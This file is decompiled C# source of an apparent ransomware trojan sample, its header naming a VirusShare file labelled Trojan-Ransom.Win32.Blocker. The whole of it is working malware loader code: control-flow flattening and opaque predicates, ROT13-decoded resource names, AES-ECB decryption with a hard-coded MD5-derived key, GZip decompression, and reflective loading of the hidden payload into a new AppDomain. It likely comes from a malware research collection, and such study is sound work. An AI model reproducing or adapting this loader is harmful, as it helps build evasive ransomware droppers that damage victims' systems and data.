// Decompiled with JetBrains decompiler
// Type: Deeldo
// Assembly: PiL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7664985-09A7-493D-8C19-5EB3EE415EDD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.aktd-99149a5307f7f7bbc6adf23e38c057b5e5c1ea73.exe

using i4ip646U7D4B0F9bxB;
using MDerKetwcrNjmvf98b;
using QHKqFxIFS6AQHa2ETr;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public static class Deeldo
{
  public static List<Thread> Threads;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void Main()
  {
    Deeldo.PuquWavAVsFrDYUJ7f();
    int num1;
    if (Deeldo.avtN61bkTM4TsQ4gkS())
    {
      if (true)
      {
        num1 = 2;
        goto label_6;
      }
    }
    else
      goto label_3;
label_2:
    u7gkCmS18k3KBpqvvL.kLjw4iIsCLsZtxc4lksN0j();
    goto label_5;
label_3:
    num1 = 4;
    goto label_6;
label_4:
    List<Thread>.Enumerator enumerator = Deeldo.Threads.GetEnumerator();
    num1 = 5;
    goto label_6;
label_5:
    Deeldo.RunCreateThread(Deeldo.Decode(KvKwE9nsaKRvsNBidB.o251O3bR8(0)), new object[5]
    {
      (object) Deeldo.Mountain(Deeldo.Dew(Deeldo.Decode(KvKwE9nsaKRvsNBidB.o251O3bR8(16)))),
      (object) true,
      (object) "",
      (object) true,
      (object) 0
    });
    goto label_4;
label_6:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_2;
        case 1:
        case 4:
          goto label_5;
        case 3:
          goto label_4;
        case 5:
          goto label_8;
        default:
          num1 = 3;
          continue;
      }
    }
label_8:
    try
    {
      while (true)
      {
        bool flag = enumerator.MoveNext();
label_15:
        Thread current;
        int num2;
        while (flag)
        {
          current = enumerator.Current;
          if (!Deeldo.PuquWavAVsFrDYUJ7f())
          {
            if (Deeldo.avtN61bkTM4TsQ4gkS())
            {
              num2 = 2;
              goto label_13;
            }
            else
              goto label_11;
          }
          else
          {
            num2 = 3;
            if (true)
              goto label_13;
          }
        }
        goto label_16;
label_11:
        current.Join();
        continue;
label_13:
        switch (num2)
        {
          case 0:
          case 2:
            goto label_11;
          case 4:
            goto label_17;
          default:
            goto label_15;
        }
label_16:
        num2 = 4;
        goto label_13;
      }
label_17:;
    }
    finally
    {
      enumerator.Dispose();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void RunCreateThread(string name, object[] paramss)
  {
    int num = 4;
    while (true)
    {
      Thread thread;
      switch (num)
      {
        case 0:
        case 1:
          thread.Priority = ThreadPriority.AboveNormal;
          break;
        case 4:
          thread = new Thread(new ParameterizedThreadStart(Deeldo.Arizona));
          Deeldo.PuquWavAVsFrDYUJ7f();
          if (Deeldo.avtN61bkTM4TsQ4gkS())
          {
            if (Deeldo.avtN61bkTM4TsQ4gkS())
            {
              num = 0;
              continue;
            }
            goto case 0;
          }
          else
          {
            num = 3;
            continue;
          }
        case 5:
          goto label_6;
      }
      thread.Start((object) new object[2]
      {
        (object) name,
        (object) paramss
      });
      Deeldo.Threads.Add(thread);
      num = 5;
    }
label_6:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] Logitech(string A)
  {
    int num = Deeldo.PuquWavAVsFrDYUJ7f() ? 4 : 1;
    byte[] numArray1;
    while (true)
    {
      Stream stream;
      byte[] numArray2;
      switch (num)
      {
        case 0:
        case 1:
          stream = (Stream) Deeldo.ARUlWmNPkgSuhDX0FK((object) Assembly.GetExecutingAssembly(), (object) A);
          if (Deeldo.avtN61bkTM4TsQ4gkS())
          {
            num = 3;
            continue;
          }
          goto case 3;
        case 3:
          numArray2 = new byte[Deeldo.pswJFSRKqWqQEB0LF3((object) stream)];
          break;
        case 5:
          goto label_6;
      }
      Deeldo.nSmX1OSqkC85xtGZtq((object) stream, (object) numArray2, 0, (int) stream.Length);
      numArray1 = numArray2;
      num = 5;
    }
label_6:
    return numArray1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] Dew(string rName)
  {
    int num = !Deeldo.avtN61bkTM4TsQ4gkS() ? 5 : 4;
    string[] strArray1;
    List<byte> byteList;
    string[] strArray2;
    int index;
    byte[] array;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 4:
          strArray1 = Encoding.GetEncoding(1252).GetString(Deeldo.Logitech(rName)).Split(',');
          if (true)
          {
            num = 1;
            continue;
          }
          goto case 1;
        case 1:
          byteList = new List<byte>();
          goto case 2;
        case 2:
        case 5:
          strArray2 = strArray1;
          index = 0;
          goto case 3;
        case 3:
          for (; index < strArray2.Length; ++index)
          {
            string A = strArray2[index];
            byteList.AddRange((IEnumerable<byte>) Deeldo.Logitech(A));
          }
          array = byteList.ToArray();
          if (true)
          {
            num = 6;
            continue;
          }
          goto label_10;
        case 6:
          goto label_10;
        default:
          num = 3;
          continue;
      }
    }
label_10:
    return array;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] Mountain(byte[] input)
  {
    int num = 0;
    if (!Deeldo.PuquWavAVsFrDYUJ7f())
      goto label_4;
label_1:
    ICryptoTransform decryptor;
    input = (byte[]) Deeldo.XtI0Byr9Gps1JkNUV6((object) decryptor, (object) input, 0, input.Length);
    MemoryStream memoryStream = new MemoryStream();
    num = 6;
label_4:
    RijndaelManaged rijndaelManaged;
    while (true)
    {
      switch (num)
      {
        case 0:
          rijndaelManaged = new RijndaelManaged();
          num = Deeldo.PuquWavAVsFrDYUJ7f() ? 5 : 4;
          continue;
        case 1:
        case 4:
          goto label_2;
        case 2:
        case 5:
          goto label_3;
        case 3:
          goto label_1;
        case 6:
          goto label_7;
        default:
          num = 3;
          continue;
      }
    }
label_2:
    byte[] destinationArray = new byte[32];
label_3:
    byte[] hash = new MD5CryptoServiceProvider().ComputeHash(new byte[46]
    {
      (byte) 77,
      (byte) 63,
      (byte) 56,
      (byte) 68,
      (byte) 117,
      (byte) 69,
      (byte) 73,
      (byte) 47,
      (byte) 112,
      (byte) 79,
      (byte) 120,
      (byte) 49,
      (byte) 82,
      (byte) 88,
      (byte) 125,
      (byte) 126,
      (byte) 101,
      (byte) 126,
      (byte) 62,
      (byte) 59,
      (byte) 41,
      (byte) 97,
      (byte) 82,
      (byte) 116,
      (byte) 98,
      (byte) 51,
      (byte) 109,
      (byte) 113,
      (byte) 63,
      (byte) 51,
      (byte) 85,
      (byte) 85,
      (byte) 70,
      (byte) 85,
      (byte) 66,
      (byte) 52,
      (byte) 122,
      (byte) 57,
      (byte) 119,
      (byte) 122,
      (byte) 85,
      (byte) 99,
      (byte) 82,
      (byte) 50,
      (byte) 83,
      (byte) 38
    });
    Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
    Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
    rijndaelManaged.Key = destinationArray;
    rijndaelManaged.Mode = CipherMode.ECB;
    decryptor = rijndaelManaged.CreateDecryptor();
    goto label_1;
label_7:
    try
    {
      int int32 = BitConverter.ToInt32(input, 0);
      memoryStream.Write(input, 4, input.Length - 4);
      byte[] buffer = new byte[int32];
      memoryStream.Position = 0L;
      using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
        gzipStream.Read(buffer, 0, buffer.Length);
      return buffer;
    }
    finally
    {
      if (memoryStream != null)
        Deeldo.vgD8sBkEbYoSQdrsHi((object) memoryStream);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void Arizona(object state)
  {
    int num = 4;
    if (Deeldo.PuquWavAVsFrDYUJ7f())
      ;
    AppDomain domain;
    Deeldo.InstanceProxy instanceFromAndUnwrap;
    object[] objArray;
    string n;
    object[] p;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          instanceFromAndUnwrap = (Deeldo.InstanceProxy) domain.CreateInstanceFromAndUnwrap(Assembly.GetExecutingAssembly().Location, typeof (Deeldo.InstanceProxy).ToString());
          goto case 5;
        case 1:
        case 3:
          n = (string) objArray[0];
          p = (object[]) objArray[1];
          domain = AppDomain.CreateDomain(KvKwE9nsaKRvsNBidB.o251O3bR8(58));
          goto case 0;
        case 4:
          objArray = (object[]) state;
          Deeldo.PuquWavAVsFrDYUJ7f();
          num = !Deeldo.avtN61bkTM4TsQ4gkS() ? 0 : 3;
          continue;
        case 5:
          if (instanceFromAndUnwrap != null)
          {
            if (n == KvKwE9nsaKRvsNBidB.o251O3bR8(68) && Deeldo.Net((byte[]) p[0]))
              instanceFromAndUnwrap.Run((byte[]) p[0]);
            else
              instanceFromAndUnwrap.Inu(n, p);
            AppDomain.Unload(domain);
            num = 6;
            continue;
          }
          goto label_5;
        case 6:
          goto label_12;
        default:
          num = 5;
          continue;
      }
    }
label_5:
    return;
label_12:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Net(byte[] bytes)
  {
    bool flag;
    try
    {
      Assembly.Load(bytes);
      switch (Deeldo.PuquWavAVsFrDYUJ7f() ? 3 : 2)
      {
        case 0:
        case 2:
          flag = true;
          break;
      }
    }
    catch
    {
      flag = false;
    }
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void Invoke(MethodInfo info, object[] invokeParams) => Deeldo.Tl1EfmF2jvilfHVHBp((object) info, (object) null, (object) invokeParams);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static object[] GetInfo(byte[] data, AppDomain domain)
  {
    int num = 3;
    object[] info;
    while (true)
    {
      object[] objArray;
      switch (num)
      {
        case 1:
        case 4:
          objArray[1] = (object) domain.Load(data);
          break;
        case 3:
          objArray = new object[2];
          Deeldo.PuquWavAVsFrDYUJ7f();
          num = !Deeldo.avtN61bkTM4TsQ4gkS() ? 0 : 4;
          continue;
        case 5:
          goto label_5;
      }
      info = objArray;
      num = 5;
    }
label_5:
    return info;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static string Decode(string input)
  {
    int num1 = 3;
    string str;
    while (true)
    {
      char[] charArray;
      int index;
      int num2;
      switch (num1)
      {
        case 0:
label_8:
          if (index >= charArray.Length)
          {
            str = new string(charArray);
            num1 = 6;
            continue;
          }
          if (charArray[index] > 'Z' || charArray[index] < 'A')
            break;
          goto case 2;
        case 1:
        case 5:
          num2 = 13;
          index = 0;
          goto case 0;
        case 2:
        case 4:
          charArray[index] = (char) (((int) charArray[index] - 65 + num2) % 26 + 65);
          break;
        case 3:
          charArray = input.ToCharArray();
          num1 = !Deeldo.avtN61bkTM4TsQ4gkS() ? 4 : 5;
          continue;
        case 6:
          goto label_12;
        default:
          num1 = 0;
          continue;
      }
      if (charArray[index] <= 'z' && charArray[index] >= 'a')
        charArray[index] = (char) (((int) charArray[index] - 97 + num2) % 26 + 97);
      ++index;
      goto label_8;
    }
label_12:
    return str;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Deeldo()
  {
    int num;
    if (Deeldo.avtN61bkTM4TsQ4gkS())
    {
      if (!Deeldo.PuquWavAVsFrDYUJ7f())
      {
        num = 3;
        goto label_3;
      }
    }
    else
      goto label_8;
label_2:
    Deeldo.pPwl3nGqtkonZuOaU5();
    goto label_5;
label_3:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          goto label_6;
        case 1:
        case 2:
          goto label_2;
        case 4:
          goto label_5;
        case 5:
          goto label_7;
        default:
          num = 4;
          continue;
      }
    }
label_7:
    return;
label_6:
    u7gkCmS18k3KBpqvvL.kLjw4iIsCLsZtxc4lksN0j();
    goto label_2;
label_5:
    Deeldo.Threads = new List<Thread>();
    num = 5;
    goto label_3;
label_8:
    num = 2;
    goto label_3;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool avtN61bkTM4TsQ4gkS() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool PuquWavAVsFrDYUJ7f() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object ARUlWmNPkgSuhDX0FK([In] object obj0, [In] object obj1) => (object) ((Assembly) obj0).GetManifestResourceStream((string) obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static long pswJFSRKqWqQEB0LF3([In] object obj0) => ((Stream) obj0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int nSmX1OSqkC85xtGZtq([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Read((byte[]) obj1, obj2, obj3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object XtI0Byr9Gps1JkNUV6([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => (object) ((ICryptoTransform) obj0).TransformFinalBlock((byte[]) obj1, obj2, obj3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void vgD8sBkEbYoSQdrsHi([In] object obj0) => ((IDisposable) obj0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object Tl1EfmF2jvilfHVHBp([In] object obj0, [In] object obj1, [In] object obj2) => ((MethodBase) obj0).Invoke(obj1, (object[]) obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void pPwl3nGqtkonZuOaU5() => QNpxWykqLW1cyWF3C9.EN68eavznqBsn();

  public class InstanceProxy : MarshalByRefObject
  {
    public Assembly asm;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Inu(string n, object[] p)
    {
      Deeldo.InstanceProxy.s6PyP2B8WNGjt5EwT0();
      int num;
      if (!Deeldo.InstanceProxy.iNvKM5OoLTTkWw8S9a())
      {
        num = 2;
        goto label_15;
      }
      else
        goto label_11;
label_4:
      int index;
      ++index;
label_5:
      System.Type[] types;
      MethodInfo methodInfo;
      System.Type type;
      if (index >= types.Length)
      {
        Deeldo.InstanceProxy.PYyscsUWuYST38SV75((object) methodInfo, (object) p);
        num = 6;
        goto label_15;
      }
      else
      {
        type = types[index];
        if (Deeldo.InstanceProxy.s6PyP2B8WNGjt5EwT0())
        {
          num = 5;
          goto label_15;
        }
        else
          goto label_9;
      }
label_7:
      types = this.asm.GetTypes();
      index = 0;
      goto label_5;
label_9:
      methodInfo = (MethodInfo) null;
      goto label_7;
label_11:
      num = 4;
      if (Deeldo.InstanceProxy.s6PyP2B8WNGjt5EwT0())
        goto label_15;
label_12:
      foreach (MethodInfo method in type.GetMethods())
      {
        if (method.Name == n)
        {
          methodInfo = method;
          break;
        }
      }
      goto label_4;
label_15:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_9;
          case 1:
          case 4:
            goto label_7;
          case 3:
            goto label_4;
          case 5:
            goto label_12;
          case 6:
            goto label_10;
          default:
            if (Deeldo.InstanceProxy.s6PyP2B8WNGjt5EwT0())
            {
              num = 3;
              continue;
            }
            goto label_17;
        }
      }
label_10:
      return;
label_17:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Run(byte[] bytes)
    {
      try
      {
        System.Type[] types = this.asm.GetTypes();
        int num;
        if (!Deeldo.InstanceProxy.iNvKM5OoLTTkWw8S9a())
          num = 4;
        else
          goto label_5;
label_4:
        while (true)
        {
          int index;
          switch (num)
          {
            case 0:
            case 4:
              index = 0;
              break;
            case 1:
              ++index;
              break;
            case 5:
              goto label_6;
          }
          if (index >= types.Length)
          {
            num = 5;
          }
          else
          {
            foreach (MethodInfo method in types[index].GetMethods())
            {
              if (method.Name == KvKwE9nsaKRvsNBidB.o251O3bR8(78))
                Deeldo.InstanceProxy.PYyscsUWuYST38SV75((object) method, (object) new object[2]
                {
                  Deeldo.InstanceProxy.GjGRKotEbWXdtTwHir(),
                  (object) bytes
                });
            }
            num = 1;
          }
        }
label_6:
        return;
label_5:
        num = 3;
        if (Deeldo.InstanceProxy.iNvKM5OoLTTkWw8S9a())
          goto label_4;
        else
          goto label_4;
      }
      catch (Exception ex)
      {
        int num = (int) Deeldo.InstanceProxy.VnXuqnX6x067BYAK9a((object) ex.ToString());
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public InstanceProxy()
    {
      int num = Deeldo.InstanceProxy.iNvKM5OoLTTkWw8S9a() ? 1 : 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            QNpxWykqLW1cyWF3C9.EN68eavznqBsn();
            num = 4;
            continue;
          case 4:
            this.asm = AppDomain.CurrentDomain.Load(Deeldo.Mountain(Deeldo.Dew(Deeldo.Decode(KvKwE9nsaKRvsNBidB.o251O3bR8(94)))));
            break;
          case 5:
            goto label_3;
        }
        // ISSUE: explicit constructor call
        base.\u002Ector();
        num = 5;
      }
label_3:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void PYyscsUWuYST38SV75([In] object obj0, [In] object obj1) => Deeldo.Invoke((MethodInfo) obj0, (object[]) obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool s6PyP2B8WNGjt5EwT0() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool iNvKM5OoLTTkWw8S9a() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object GjGRKotEbWXdtTwHir() => (object) AppDomain.CurrentDomain;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static DialogResult VnXuqnX6x067BYAK9a([In] object obj0) => MessageBox.Show((string) obj0);
  }
}
